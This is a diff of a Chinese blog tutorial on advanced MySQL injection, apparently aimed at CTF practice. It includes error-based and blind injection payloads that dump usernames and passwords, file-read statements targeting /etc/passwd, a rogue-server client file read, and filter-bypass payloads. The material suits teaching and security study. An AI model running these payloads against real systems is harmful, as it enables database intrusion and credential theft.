@@ -680,10 +680,14 @@ multilinestring()：id=1 AND multilinestring((select * from(select * from(select
 linestring()：id=1 AND LINESTRING((select * from(select * from(select user())a)b))
 multipolygon() ：id=1 AND multipolygon((select * from(select * from(select user())a)b))</code></pre>
 <h4 id="基于BIGINT溢出错误的SQL注入-Mysql-gt-5-5-5-："><a href="#基于BIGINT溢出错误的SQL注入-Mysql-gt-5-5-5-：" class="headerlink" title="基于BIGINT溢出错误的SQL注入(Mysql>5.5.5)："></a>基于BIGINT溢出错误的SQL注入(Mysql&gt;5.5.5)：</h4><p>这种注入方式有很多的运算符可用，这里举的例子就只使用其中一种，具体可参考：<a href="https://blog.csdn.net/weixin_43902454/article/details/96495984" target="_blank" rel="noopener">https://blog.csdn.net/weixin_43902454/article/details/96495984</a><br>数据库：</p>
-<pre><code>!(select*from(select database())x)-~0</code></pre><p>表名：</p>
-<pre><code>!(select*from(select table_name from information_schema.tables where table_schema=database() limit 0,1)x)-~0</code></pre><p>列名：</p>
-<pre><code>select !(select*from(select column_name from information_schema.columns where table_name='users' limit 0,1)x)-~0;</code></pre><p>字段：</p>
-<pre><code>!(select*from(select concat_ws(':',id, username, password) from users limit 0,1)x)-~0;</code></pre><h4 id="3-3-不存在的函数"><a href="#3-3-不存在的函数" class="headerlink" title="3-3.不存在的函数"></a>3-3.不存在的函数</h4><p>随便输入一个不存在的函数，可能会返回当前所在的数据库名称。</p>
+<pre><code class="mysql">!(select*from(select database())x)-~0</code></pre>
+<p>表名：</p>
+<pre><code class="mysql">!(select*from(select table_name from information_schema.tables where table_schema=database() limit 0,1)x)-~0</code></pre>
+<p>列名：</p>
+<pre><code class="mysql">select !(select*from(select column_name from information_schema.columns where table_name='users' limit 0,1)x)-~0;</code></pre>
+<p>字段：</p>
+<pre><code class="mysql">!(select*from(select concat_ws(':',id, username, password) from users limit 0,1)x)-~0;</code></pre>
+<h4 id="3-3-不存在的函数"><a href="#3-3-不存在的函数" class="headerlink" title="3-3.不存在的函数"></a>3-3.不存在的函数</h4><p>随便输入一个不存在的函数，可能会返回当前所在的数据库名称。</p>
 <h4 id="3-4-name-const"><a href="#3-4-name-const" class="headerlink" title="3-4.name_const()"></a>3-4.name_const()</h4><p>仅可获取数据库版本信息<br>payload: select * from(select name_const(version(),0x1),name_const(version(),0x1))a</p>
 <h4 id="3-5-uuid相关函数-Mysql版本8-0-x"><a href="#3-5-uuid相关函数-Mysql版本8-0-x" class="headerlink" title="3-5.uuid相关函数(Mysql版本8.0.x)"></a>3-5.uuid相关函数(Mysql版本8.0.x)</h4><p>参数格式不正确。<br>SELECT UUID_TO_BIN((SELECT password FROM users WHERE id=1));<br>SELECT BIN_TO_UUID((SELECT password FROM users WHERE id=1));</p>
 <h4 id="3-6-报错函数速查表"><a href="#3-6-报错函数速查表" class="headerlink" title="3-6.报错函数速查表"></a>3-6.报错函数速查表</h4><table>
@@ -843,9 +847,10 @@ multipolygon() ：id=1 AND multipolygon((select * from(select * from(select user
 <li>为目录名，表示仅允许对特定目录的文件进行读/写。</li>
 </ul>
 <p>TIPS：5.5.53本身及之后的版本默认值为NULL，之前的版本无内容。<br>三种方法查看当前secure-file-priv的值：</p>
-<pre><code>select @@secure_file_priv;
+<pre><code class="mysql">select @@secure_file_priv;
 select @@global.secure_file_priv;
-show variables like "secure_file_priv";</code></pre><p>两个参数的修改：<br>通过修改my.ini文件，添加：secure-file-priv=<br>启动时添加参数：mysqld.exe –secure-file-priv=</p>
+show variables like "secure_file_priv";</code></pre>
+<p>两个参数的修改：<br>通过修改my.ini文件，添加：secure-file-priv=<br>启动时添加参数：mysqld.exe –secure-file-priv=</p>
 <h4 id="4-2-读文件"><a href="#4-2-读文件" class="headerlink" title="4-2.读文件"></a>4-2.读文件</h4><p>Mysql读取文件通常使用load_file函数，语法如下：<br>select load_file(file_path);<br>第二种：<br>load data infile “/etc/passwd” into table test FIELDS TERMINATED BY ‘\n’;    #读取服务端文件<br>第三种：<br>load data local infile “/etc/passwd” into table test FIELDS TERMINATED BY ‘\n’;    #读取客户端文件</p>
 <p>限制：</p>
 <ul>
@@ -854,10 +859,11 @@ show variables like "secure_file_priv";</code></pre><p>两个参数的修改：<
 <li>要读取的文件大小必须小于max_allowed_packet所设置的值</li>
 </ul>
 <h5 id="低权限读取文件"><a href="#低权限读取文件" class="headerlink" title="低权限读取文件"></a>低权限读取文件</h5><p>5.5.53secure-file-priv=NULL读文件payload，mysql8测试失败，其他版本自测。</p>
-<pre><code>drop table mysql.m1;
+<pre><code class="mysql">drop table mysql.m1;
 CREATE TABLE mysql.m1 (code TEXT );
 LOAD DATA LOCAL INFILE 'D://1.txt' INTO TABLE mysql.m1 fields terminated by '';
-select * from mysql.m1;</code></pre><h5 id="Mysql连接数据库时可读取文件（配合SSRF-）"><a href="#Mysql连接数据库时可读取文件（配合SSRF-）" class="headerlink" title="Mysql连接数据库时可读取文件（配合SSRF?）"></a>Mysql连接数据库时可读取文件（配合SSRF?）</h5><p>这个漏洞是mysql的一个特性产生的，是上述的第三种读文件的方法为基础的。<br>简单描述该漏洞：<br>Mysql客户端在执行load data local语句的时，先向mysql服务端发送请求，服务端接收到请求，并返回需要读取的文件地址，客户端接收该地址并进行读取，接着将读取到的内容发送给服务端。用通俗的语言可以描述如下：</p>
+select * from mysql.m1;</code></pre>
+<h5 id="Mysql连接数据库时可读取文件（配合SSRF-）"><a href="#Mysql连接数据库时可读取文件（配合SSRF-）" class="headerlink" title="Mysql连接数据库时可读取文件（配合SSRF?）"></a>Mysql连接数据库时可读取文件（配合SSRF?）</h5><p>这个漏洞是mysql的一个特性产生的，是上述的第三种读文件的方法为基础的。<br>简单描述该漏洞：<br>Mysql客户端在执行load data local语句的时，先向mysql服务端发送请求，服务端接收到请求，并返回需要读取的文件地址，客户端接收该地址并进行读取，接着将读取到的内容发送给服务端。用通俗的语言可以描述如下：</p>
 <p>原本的查询流程为：<br><code><br>客户端：我要把我的win.ini文件内容插入test表中<br>服务端：好，我要你的win.ini文件内容<br>客户端：win.ini的内容如下....</code></p>
 <p>假设服务端由我们控制，把一个正常的流程篡改成如下<br><code><br>客户端：我要把我的win.ini文件内容插入test表中<br>服务端：好，我要你的conn.php内容<br>客户端：conn.php的内容如下???<br></code><br>换句话说：load data local语句要读取的文件会受到服务端的控制。<br>其次，在Mysql官方文档对于load data local语句的安全说明中有这么一句话:</p>
 <pre>A patched server could in fact reply with a file-transfer request to any statement, not just LOAD DATA LOCAL, so a more fundamental issue is that clients should not connect to untrusted servers.
@@ -1328,8 +1334,9 @@ mysql&gt; set global slow_query_log=1;
 </tbody>
 </table>
 <p>PS：查看全部全局变量<code>SHOW GLOBAL VARIABLES;</code>。</p>
+#### 7-7.其他常用函数/语句
 
-<h4 id="7-7-其他常用函数-语句"><a href="#7-7-其他常用函数-语句" class="headerlink" title="7-7.其他常用函数/语句"></a>7-7.其他常用函数/语句</h4><table>
+<table>
 <thead><tr>
 <th>函数/语句</th>
 <th>说明</th>
@@ -1396,10 +1403,12 @@ mysql&gt; set global slow_query_log=1;
 <h2 id="8-一些特殊的注入方式"><a href="#8-一些特殊的注入方式" class="headerlink" title="8.一些特殊的注入方式"></a>8.一些特殊的注入方式</h2><h4 id="8-1-order-by-大小比较盲注："><a href="#8-1-order-by-大小比较盲注：" class="headerlink" title="8-1.order by 大小比较盲注："></a>8-1.order by 大小比较盲注：</h4><p>参考链接：<a href="https://blog.csdn.net/miuzzx/article/details/104908543" target="_blank" rel="noopener">https://blog.csdn.net/miuzzx/article/details/104908543</a><br>使用条件：<br>当遇到的盲注题过滤了括号，且知道username和password的单独回显时，便可考虑使用该方法<br>例子：</p>
 <pre><code>select * from users where (select 'r' union select user() order by 1 limit 1)='r'</code></pre><p>实际上此处是利用了order by语句的排序功能来进行判断的。若我们想要查询的数据开头的首字母在字母表的位值比我们判断的值要靠后，则limit语句将不会让其输出，那么整个条件将会成立，否之不成立。<br>利用这种方法可以做到不需要使用like、rlike、regexp等匹配语句以及字符操作函数。</p>
 <p>再举个例子：</p>
-<pre><code>select username,flag,password from users where username='$username;'</code></pre><p>页面回显的字段为：username与password，如何在union与flag两单词被拦截、无报错信息返回的情况下获取到用户名为admin的flag值？</p>
+<pre><code class="mysql">select username,flag,password from users where username='$username;'</code></pre>
+<p>页面回显的字段为：username与password，如何在union与flag两单词被拦截、无报错信息返回的情况下获取到用户名为admin的flag值？</p>
 <p>我们前边讲到了无列名注入，通过使用union语句来对未知列名进行重命名的形式绕过，还讲过通过使用join using()报错注入出列名。但现在，这两种方法都不可以的情况下该如何获取到flag字段的内容？</p>
 <p>使用order by可轻松盲注出答案。payload：</p>
-<pre><code>select username,flag,password from users where username='admin' union select 1,'a',3 order by 2</code></pre><p>与之前的原理相同，通过判断前后两个select语句返回的数据前后顺序来进行盲注。</p>
+<pre><code class="mysql">select username,flag,password from users where username='admin' union select 1,'a',3 order by 2</code></pre>
+<p>与之前的原理相同，通过判断前后两个select语句返回的数据前后顺序来进行盲注。</p>
 <h4 id="8-2-约束攻击"><a href="#8-2-约束攻击" class="headerlink" title="8-2.约束攻击"></a>8-2.约束攻击</h4><p>先举个例子：<br>建立一个用户表：做了25个字符的限制</p>
 <pre><code class="sql">CREATE TABLE users(
     username varchar(25),
@@ -1453,13 +1462,15 @@ if($rs-&gt;fetch_row()){
 <p>注意这里会多加一个^0或1是因为在盲注的时候可能出现了语法错误也无法判断,而改变这里的0或1,如果返回的结果是不同的,那就可以证明语法是没有问题的</p>
 <p>例题可参考<br><a href="http://pipinstall.cn/ciscn2019-华北赛区-day2-web1hack-world/" target="_blank" rel="noopener" title="[CISCN2019 华北赛区 Day2 Web1]Hack World">[CISCN2019 华北赛区 Day2 Web1]Hack World</a><br><a href="http://pipinstall.cn/网鼎杯2018unfinish/" target="_blank" rel="noopener" title="[网鼎杯2018]Unfinish">[网鼎杯2018]Unfinish</a></p>
 <h4 id="8-4-regexp注入："><a href="#8-4-regexp注入：" class="headerlink" title="8-4.regexp注入："></a>8-4.regexp注入：</h4><p>这应该算一个小trick，就是在注入语句后面添加regexp+正则表达式来过滤查询出的内容<br>如：</p>
-<pre><code>(updatexml(1,concat(0x3a,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('^f'))),1))#</code></pre><p>筛选出以f开头的结果<br>例题可参考<a href="http://pipinstall.cn/rctf2015easysql/" target="_blank" rel="noopener" title="[RCTF2015]EasySQL">[RCTF2015]EasySQL</a></p>
+<pre><code class="mysql">(updatexml(1,concat(0x3a,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('^f'))),1))#</code></pre>
+<p>筛选出以f开头的结果<br>例题可参考<a href="http://pipinstall.cn/rctf2015easysql/" target="_blank" rel="noopener" title="[RCTF2015]EasySQL">[RCTF2015]EasySQL</a></p>
 <h4 id="8-5-无列名注入："><a href="#8-5-无列名注入：" class="headerlink" title="8-5.无列名注入："></a>8-5.无列名注入：</h4><p>利用join进行无列名注入（利用union进行重命名）<br>这个在上面information_schema的Bypass已经讲过了，就不再重复了</p>
 <p>通过select进行盲注<br>前边提到了，在知道表名，不知道列名的情况下，我们可以给未知列名“重命名”，还可以利用报错函数来注入出列名。现在，除了之前的order by盲注之外，这里再提一种新的方法，直接通过select进行盲注。<br>核心payload：(select ‘admin’,’admin’)&gt;(select * from users limit 1)<br>子查询之间也可以直接通过&gt;、&lt;、=来进行判断。</p>
 <p>例题参考：[GYCTF2020]Ezsqli</p>
 <h4 id="8-6-Update-Insert-Delete注入"><a href="#8-6-Update-Insert-Delete注入" class="headerlink" title="8-6.Update/Insert/Delete注入"></a>8-6.Update/Insert/Delete注入</h4><p>上述三个注入一般出现在用户信息更新、用户信息添加和用户信息删除的业务中，通常配合报错注入，具体可参考其他大佬的说明，这里就不再赘述了</p>
 <h4 id="8-7-反引号注入"><a href="#8-7-反引号注入" class="headerlink" title="8-7.反引号注入"></a>8-7.反引号注入</h4><p>反引号在sql注入中可起到分隔符（代替某些字段的空格，但用处不大）和注释符的作用<br>分隔符：</p>
-<pre><code>'union select1,2,group_concat(table_name) from`information_schema`.tables--+</code></pre><p>注释符：在某些情况下，`可当作注释符使用，如下<br><img src="http://pipinstall.cn/img/Mysql%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6%E6%93%8D%E4%BD%9C%E6%80%BB%E7%BB%93/%E5%9B%BE%E7%89%878.png" alt=""></p>
+<pre><code class="mysql">'union select1,2,group_concat(table_name) from`information_schema`.tables--+</code></pre>
+<p>注释符：在某些情况下，`可当作注释符使用，如下<br><img src="http://pipinstall.cn/img/Mysql%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6%E6%93%8D%E4%BD%9C%E6%80%BB%E7%BB%93/%E5%9B%BE%E7%89%878.png" alt=""></p>
 <h4 id="8-8-PDO场景下的SQL注入"><a href="#8-8-PDO场景下的SQL注入" class="headerlink" title="8-8.PDO场景下的SQL注入"></a>8-8.PDO场景下的SQL注入</h4><ul>
 <li>堆叠<br><a href="https://xz.aliyun.com/t/3950#toc-0" target="_blank" rel="noopener" title="参考">参考</a><br>PDO默认支持多语句查询，如果php版本小于5.5.21或者创建PDO实例时未设置PDO::MYSQL_ATTR_MULTI_STATEMENTS为false时可能会造成堆叠注入<br>如果想禁止多语句执行，可在创建PDO实例时将PDO::MYSQL_ATTR_MULTI_STATEMENTS设置为false</li>
 </ul>
@@ -1541,7 +1552,8 @@ $sql="SELECT * FROM users WHERE id=1 LIMIT 0,1 into $id";</code></pre>
     ?&gt;</code></pre>
 <p>题目前面做了一点限制，关键在后面，需要我们输入的password与查询出的结果相等（weak）才返回flag</p>
 <p>payload：</p>
-<pre><code>'or/**/1=1/**/GROUP/**/BY/**/password/**/WITH/**/ROLLUP/**/LIMIT/**/1/**/OFFSET/**/1#</code></pre><p>payload解释：</p>
+<pre><code class="mysql">'or/**/1=1/**/GROUP/**/BY/**/password/**/WITH/**/ROLLUP/**/LIMIT/**/1/**/OFFSET/**/1#</code></pre>
+<p>payload解释：</p>
 <ul>
 <li><p>后面的limit…offset…自然不用多说，绕过逗号</p>
 </li>
